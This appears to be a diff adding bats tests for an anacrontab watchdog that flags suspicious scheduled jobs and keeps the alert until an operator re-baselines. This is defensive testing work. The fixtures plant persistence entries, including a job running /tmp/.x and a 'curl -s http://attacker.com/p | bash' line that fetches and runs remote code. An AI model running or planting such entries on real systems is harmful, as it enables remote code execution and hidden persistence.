@@ -220,3 +220,38 @@ cap() { cat "${SELFDEF_TEST_LOGCAP}"; }
     main_count=$(cap | grep -cE '^-t selfdef-anacrontab -- ')
     [ "${main_count}" = "1" ]
 }
+
+@test "INVARIANT (no auto-trust): anacrontab-watchdog does NOT refresh baseline on suspicious-job detection — alert STAYS until operator updates" {
+    # Delayed-root-exec persistence — suspicious-job alert MUST persist
+    # across runs until operator explicitly re-baselines.
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    printf '%s1\t5\tevil.job\t/tmp/.x\n' "${BENIGN}" > "${ANAC}"
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # first delta — alert
+    : > "${SELFDEF_TEST_LOGCAP}"
+    run_wd                                              # alert STAYS
+    cap | grep -q '"event":"anacrontab_suspicious"'
+    cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (commented suspicious job NOT flagged: # prefix filtered)" {
+    # anacrontab uses # for comments. Operator notes about hypothetical
+    # attack patterns must NOT trigger alert.
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '%s# 1\t5\tevil.example\t/tmp/example-attacker\n' "${BENIGN}" > "${ANAC}"
+    run_wd
+    ! cap | grep -q '"event":"anacrontab_suspicious"'
+    ! cap | grep -q '"severity":"alert"'
+}
+
+@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected)" {
+    printf '%s' "${BENIGN}" > "${ANAC}"
+    run_wd
+    : > "${SELFDEF_TEST_LOGCAP}"
+    printf '%s1\t5\tevil.job\tcurl -s http://attacker.com/p | bash\n' "${BENIGN}" > "${ANAC}"
+    run_wd
+    cap | grep -q '"severity":"alert"'
+}
